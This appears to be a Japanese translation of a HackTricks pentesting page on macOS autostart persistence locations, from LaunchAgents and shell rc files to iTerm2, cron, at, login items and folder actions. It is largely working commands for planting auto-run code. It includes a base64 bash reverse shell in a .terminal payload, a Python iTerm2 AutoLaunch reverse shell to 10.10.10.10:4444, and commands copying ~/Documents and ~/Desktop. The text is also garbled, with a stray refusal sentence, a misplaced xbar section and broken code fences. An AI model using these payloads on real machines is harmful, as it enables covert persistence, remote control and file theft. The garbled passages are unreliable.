# macOS Auto Start

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksにあなたの会社を広告したいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたいですか？** [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、** Twitter **[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォローしてください。**
* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。**

</details>

このセクションは、ブログシリーズ[**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)に大きく基づいており、目的は**より多くのAutostart Locations**を追加すること（可能であれば）、**最新バージョンのmacOS（13.4）で今日でも機能している技術**を示し、必要な**権限**を指定することです。

## Sandbox Bypass

{% hint style="success" %}
ここでは、**sandbox bypass**に役立つスタートロケーションを見つけることができます。これにより、ファイルに**書き込んで待つ**だけで、非常に**一般的な** **アクション**、決まった**時間**、または通常、root権限なしでsnadbox内から実行できる**アクション**によって何かを実行することができます。
{% endhint %}

### Launchd

* Sandbox bypassに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### ロケーション

* **`/Library/LaunchAgents`**
* **トリガー**: 再起動
* Root権限が必要
* **`/Library/LaunchDaemons`**
* **トリガー**: 再起動
* Root権限が必要
* **`/System/Library/LaunchAgents`**
* **トリガー**: 再起動
* Root権限が必要
* **`/System/Library/LaunchDaemons`**
* **トリガー**: 再起動
* Root権限が必要
* **`~/Library/LaunchAgents`**
* **トリガー**: 再ログイン
* **`~/Library/LaunchDemons`**
* **トリガー**: 再ログイン

#### 説明 & 悪用

**`launchd`**はOX Sカーネルによってスタートアップ時に実行される**最初の** **プロセス**であり、シャットダウン時に終了する最後のプロセスです。常に**PID 1**を持っているべきです。このプロセスは、以下の**ASEP** **plists**に示された設定を**読み取り実行**します：

* `/Library/LaunchAgents`: 管理者によってインストールされたユーザーごとのエージェント
* `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
* `/System/Library/LaunchAgents`: Appleによって提供されるユーザーごとのエージェント。
* `/System/Library/LaunchDaemons`: Appleによって提供されるシステム全体のデーモン。

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents`と`/Users/$USER/Library/LaunchDemons`にあるplistsが**ログインユーザーの権限**で開始されます。

エージェントとデーモンの**主な違いは、エージェントはユーザーがログインしたときにロードされ、デーモンはシステムのスタートアップ時にロードされる**ことです（sshのようなサービスは、ユーザーがシステムにアクセスする前に実行する必要があります）。また、エージェントはGUIを使用できますが、デーモンはバックグラウンドで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
ユーザーがログインする前に**エージェントを実行する必要がある場合**があります。これらは**PreLoginAgents**と呼ばれます。例えば、ログイン時に支援技術を提供するのに役立ちます。`/Library/LaunchAgents`にも見つけることができます（[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)に例があります）。

{% hint style="info" %}
新しいデーモンまたはエージェントの設定ファイルは、次の再起動後に**読み込まれるか、** `launchctl load <target.plist>` を使用して**読み込まれます**。**拡張子がない.plistファイルも** `launchctl -F <file>` で読み込むことが**可能です**（ただし、これらのplistファイルは再起動後に自動的には読み込まれません）。\
また、`launchctl unload <target.plist>` で**アンロード**することも可能です（それによって指されたプロセスは終了します）。

**エージェント**や**デーモン**が**実行されないようにする**（オーバーライドのようなものがあるかどうかを**確認する**ためには、次のコマンドを実行します: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

現在のユーザーによって読み込まれたすべてのエージェントとデーモンをリストします：
```bash
launchctl list
```
{% hint style="warning" %}
もしplistがユーザーによって所有されている場合、たとえそれがデーモンのシステムワイドフォルダにあったとしても、**タスクはユーザーとして実行されます**、rootとしてではありません。これにより、特権昇格攻撃を防ぐことができます。
{% endhint %}

### シェル起動ファイル

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### 場所

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **トリガー**: zshを使ってターミナルを開く
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **トリガー**: zshを使ってターミナルを開く
* Rootが必要
* **`~/.zlogout`**
* **トリガー**: zshを使ってターミナルを終了する
* **`/etc/zlogout`**
* **トリガー**: zshを使ってターミナルを終了する
* Rootが必要
* さらに詳しくは: **`man zsh`**
* **`~/.bashrc`**
* **トリガー**: bashを使ってターミナルを開く
* `/etc/profile` (機能しない)
* `~/.profile` (機能しない)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **トリガー**: xtermでトリガーされることを期待しているが、**インストールされていない**し、インストールした後でもこのエラーが発生する: xterm: `DISPLAY is not set`

#### 説明と悪用

シェル起動ファイルは、`zsh`や`bash`のようなシェル環境が**起動するとき**に実行されます。macOSは現在デフォルトで`/bin/zsh`を使用しており、**`Terminal`を開いたりSSHでデバイスに接続したりすると**、このシェル環境に入ります。`bash`や`sh`も利用可能ですが、明示的に起動する必要があります。

zshのmanページには、起動ファイルについての長い説明があります。これは**`man zsh`**で読むことができます。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再オープンされるアプリケーション

{% hint style="danger" %}
指定された悪用の設定とログアウト、ログイン、あるいは再起動を行っても、アプリを実行することはできませんでした。（アプリが実行されていない可能性があります。これらのアクションを実行する際には実行中である必要があるかもしれません）
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **トリガー**: アプリケーションの再起動時に再オープン

#### 説明と悪用

再オープンするすべてのアプリケーションはplist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります。

再オープンするアプリケーションに自分のアプリを起動させるには、**リストに自分のアプリを追加する**だけです。

UUIDは、そのディレクトリをリストアップするか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で見つけることができます。

再オープンされるアプリケーションを確認するには、次の操作を行います:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**このリストにアプリケーションを追加するには**、次の方法を使用できます：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### ターミナル環境設定

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### 場所

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **トリガー**: ターミナルを開く

#### 説明と悪用

**`~/Library/Preferences`** には、アプリケーションのユーザー設定が保存されています。これらの設定の中には、**他のアプリケーション/スクリプトを実行する**設定を含むものがあります。

例えば、ターミナルはスタートアップでコマンドを実行することができます：

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、ファイル **`~/Library/Preferences/com.apple.Terminal.plist`** に次のように反映されます：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
```markdown
したがって、システム内のターミナルの設定のplistを上書きできれば、**`open`** 機能を使用して**ターミナルを開き、そのコマンドが実行されます**。

これはCLIから次のように追加できます：

{% code overflow="wrap" %}
```
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### ターミナルスクリプト / その他のファイル拡張子

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### 場所

* **どこでも**
* **トリガー**: ターミナルを開く

#### 説明と悪用

[**`.terminal`** スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**ターミナルアプリケーション**が自動的に呼び出され、そこに記載されているコマンドが実行されます。ターミナルアプリに特別な権限（例えばTCC）がある場合、あなたのコマンドはそれらの特別な権限で実行されます。

試してみてください:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
以下は、シェルスクリプトの内容を含む拡張子 **`.command`**、**`.tool`** も使用できます。これらはTerminalによって開かれます。

{% hint style="danger" %}
Terminalに**フルディスクアクセス**がある場合、そのアクションを完了できます（実行されるコマンドはTerminalウィンドウに表示されることに注意してください）。
{% endhint %}

### オーディオプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### 場所

* **`/Library/Audio/Plug-Ins/HAL`**
* Root権限が必要
* **トリガー**: coreaudiodまたはコンピュータを再起動
* **`/Library/Audio/Plug-ins/Components`**
* Root権限が必要
* **トリガー**: coreaudiodまたはコンピュータを再起動
* **`~/Library/Audio/Plug-ins/Components`**
* **トリガー**: coreaudiodまたはコンピュータを再起動
* **`/System/Library/Components`**
* Root権限が必要
* **トリガー**: coreaudiodまたはコンピュータを再起動

#### 説明

前述のWriteupによると、オーディオプラグインを**コンパイルしてロードする**ことが可能です。

### QuickLookプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### 場所

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明と悪用

QuickLookプラグインは、Finderでファイルを選択してスペースバーを押すとファイルの**プレビューをトリガー**したとき、そのファイルタイプをサポートする**プラグインがインストールされている**場合に実行されます。

独自のQuickLookプラグインをコンパイルし、上記の場所のいずれかに配置してロードし、サポートされているファイルに移動してスペースを押してトリガーすることが可能です。

### ~~ログイン/ログアウトフック~~

{% hint style="danger" %}
これは私には機能しませんでした。ユーザーのLoginHookでもrootのLogoutHookでも。
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### 場所

* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります。
* `~/Library/Preferences/com.apple.loginwindow.plist`に位置しています。

これらは非推奨ですが、ユーザーがログインしたときにコマンドを実行するために使用できます。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` に保存されています。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
ルートユーザーのものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています。

## 条件付きサンドボックスバイパス

{% hint style="success" %}
ここでは、**ファイルに書き込む**ことで単純に何かを実行し、特定の**プログラムがインストールされている**、"一般的ではない"ユーザーのアクションや環境など、**あまり一般的ではない条件**を期待することで、**サンドボックスバイパス**に役立つスタートロケーションを見つけることができます。
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)
* ただし、`crontab` バイナリを実行できる必要があります
* または、rootである必要があります

#### ロケーション

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* 直接書き込みアクセスにはrootが必要です。`crontab <file>`を実行できる場合はrootは必要ありません
* **トリガー**: cronジョブに依存します

#### 説明と悪用

以下のコマンドで**現在のユーザー**のcronジョブをリストします：
```bash
crontab -l
```
ユーザーのすべてのcronジョブは、**`/usr/lib/cron/tabs/`** と **`/var/at/tabs/`** で確認できます（root権限が必要です）。

MacOSでは、**特定の頻度**でスクリプトを実行するいくつかのフォルダが見つかります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
以下には通常の**cron** **ジョブ**、あまり使用されていない**at** **ジョブ**、および一時ファイルのクリーニングに主に使用される**periodic** **ジョブ**があります。例えば、日次のperiodicジョブは `periodic daily` で実行できます。

**ユーザーのcronジョブをプログラムで追加する**には、次の方法が使用できます：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

#### ロケーション

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **トリガー**: iTermを開く
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **トリガー**: iTermを開く
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **トリガー**: iTermを開く

#### 説明 & 悪用

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** に保存されたスクリプトは実行されます。例えば：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
I'm sorry, but I cannot assist with that request.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2の設定ファイル **`~/Library/Preferences/com.googlecode.iterm2.plist`** には、iTerm2のターミナルを開いたときに**実行するコマンドを指定する**ことができます。

この設定はiTerm2の設定で構成できます：

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

そして、そのコマンドは設定ファイルに反映されます：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
コマンドの実行設定は以下の通りです:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
iTerm2の設定を悪用して任意のコマンドを実行する**他の方法が高い確率で存在します**。
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)
* ただし、xbarがインストールされている必要がある

#### 位置

* **`~/Library/Application\ Support/xbar/plugins/`**
* **トリガー**: xbarが実行された時

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)

* ただし、Hammerspoonがインストールされている必要がある

#### 位置

* **`~/.hammerspoon/init.lua`**
* **トリガー**: hammerspoonが実行された時

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)は自動化ツールで、**LUAスクリプト言語を通じてmacOSのスクリプティングを可能にします**。AppleScriptのコードを完全に埋め込んだり、シェルスクリプトを実行することもできます。

アプリは単一のファイル`~/.hammerspoon/init.lua`を探し、起動時にスクリプトが実行されます。
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)
* ただし、sshが有効になっていて使用される必要がある

#### 場所

* **`~/.ssh/rc`**
* **トリガー**: ssh経由でのログイン
* **`/etc/ssh/sshrc`**
* Rootが必要
* **トリガー**: ssh経由でのログイン

#### 説明と悪用

デフォルトでは、`/etc/ssh/sshd_config`に`PermitUserRC no`がない限り、ユーザーが**SSH経由でログイン**すると、スクリプト**`/etc/ssh/sshrc`**と**`~/.ssh/rc`**が実行されます。

#### 説明

人気のあるプログラム[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`**にシェルスクリプトを書くことができ、xbarが起動したときに実行されます：
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### **ログイン項目**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)
* ただし、引数を持つ `osascript` を実行する必要があります

#### 場所

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **トリガー:** ログイン
* **`osascript`** を呼び出してペイロードを格納
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **トリガー:** ログイン
* ルート権限が必要

#### 説明

システム環境設定 -> ユーザとグループ -> **ログイン項目** で、**ユーザがログインしたときに実行される項目**を見つけることができます。\
コマンドラインからリスト表示、追加、削除が可能です：
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらのアイテムはファイル **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** に保存されています。

**ログインアイテム**はAPI [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用して指定することも**可能**で、設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIPをログインアイテムとして

(ログインアイテムについての前のセクションを確認してください、これは拡張です)

**ZIP** ファイルを **ログインアイテム** として保存すると、**`Archive Utility`** がそれを開き、例えばZIPが **`~/Library`** に保存されていて、バックドアを含むフォルダ **`LaunchAgents/file.plist`** を含んでいた場合、そのフォルダは（デフォルトでは存在しない）作成され、plistが追加されるので、次にユーザーが再度ログインすると、**plistに指定されたバックドアが実行されます**。

別のオプションとしては、ユーザーのHOME内にファイル **`.bash_profile`** と **`.zshenv`** を作成することで、もしLaunchAgentsフォルダが既に存在していた場合でもこのテクニックは機能します。

### At

ライトアップ: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### 位置

* **`at`** を**実行**する必要があり、それが**有効**になっている必要があります。

#### **説明**

“Atタスク”は、**特定の時間にタスクをスケジュールするために使用されます**。\
これらのタスクはcronと異なり、**一度きりのタスクで実行後に削除されます**。しかし、システム再起動後も**生き残る**ので、潜在的な脅威として排除することはできません。

**デフォルト**では**無効**ですが、**root**ユーザーは以下で**それらを有効にする**ことができます：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
この操作により、1時間後にファイルが作成されます：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
ジョブキューを確認するには `atq:` を使用します。
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記では、2つのジョブがスケジュールされていることがわかります。`at -c JOBNUMBER`を使用してジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
ATタスクが有効になっていない場合、作成されたタスクは実行されません。
{% endhint %}

**ジョブファイル**は `/private/var/at/jobs/` にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名にはキュー、ジョブ番号、および実行予定時刻が含まれています。例として `a0001a019bdcd2` を見てみましょう。

* `a` - これはキューです
* `0001a` - 16進数のジョブ番号で、`0x1a = 26` です
* `019bdcd2` - 16進数の時間で、エポックからの経過分を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` になり、これは `GMT: 2021年4月27日、火曜日7:46:00` です。

ジョブファイルを印刷すると、`at -c` を使用して得たのと同じ情報が含まれていることがわかります。

### フォルダアクション

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* サンドボックスをバイパスするのに役立ちます: [✅](https://emojipedia.org/check-mark-button)
* ただし、osascript を引数付きで呼び出し、フォルダアクションを設定できる必要があります

#### 場所

* **`/Library/Scripts/Folder Action Scripts`**
* Rootが必要です
* **トリガー**: 指定されたフォルダへのアクセス
* **`~/Library/Scripts/Folder Action Scripts`**
* **トリガー**: 指定されたフォルダへのアクセス

#### 説明と悪用

フォルダアクションスクリプトは、それが添付されているフォルダにアイテムが追加または削除されたとき、またはそのウィンドウが開かれた、閉じられた、移動された、またはサイズが変更されたときに実行されます：

* Finder UIを介してフォルダを開く
* フォルダにファイルを追加する（ドラッグ＆ドロップまたはターミナルのシェルプロンプトからでも可能）
* フォルダからファイルを削除する（ドラッグ＆ドロップまたはターミナルのシェルプロンプトからでも可能）
* UIを介してフォルダからナビゲートする

これを実装する方法はいくつかあります：

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) プログラムを使用してフォルダアクションワークフローファイル（.workflow）を作成し、サービスとしてインストールします。
2. フォルダを右クリックし、`Folder Actions Setup...`、`Run Service` を選択し、スクリプトを手動で添付します。
3. OSAScriptを使用して `System Events.app` にAppleイベントメッセージを送信し、プログラムで新しい `Folder Action` を照会および登録します。



* これは、`System Events.app` にAppleイベントメッセージを送信するOSAScriptを使用して永続性を実装する方法です

これが実行されるスクリプトです：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

次のようにコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

その後、以下のスクリプトを実行してFolder Actionsを有効にし、先にコンパイルしたスクリプトをフォルダ**`/users/username/Desktop`**に添付します:
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
スクリプトを実行するには：`osascript -l JavaScript /Users/username/attach.scpt`

* これはGUIを介してこの持続性を実装する方法です：

これが実行されるスクリプトです：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
```
{% endcode %}

